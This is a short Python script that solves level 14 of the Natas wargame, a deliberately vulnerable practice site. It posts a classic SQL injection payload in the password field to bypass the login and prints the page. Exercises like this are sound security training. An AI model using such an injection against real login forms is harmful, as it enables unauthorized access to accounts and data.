"""
Help script to resolve natas challenge #14
"""
import requests
import json

level = 'natas14'
url = 'http://{}.natas.labs.overthewire.org'.format(level)

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
Classical SQL injection.
"""

response = requests.post(url, auth=auth,
                         data={'username': 'natas15', 'password': 'something" or 1=1 #'})
print(response.text)
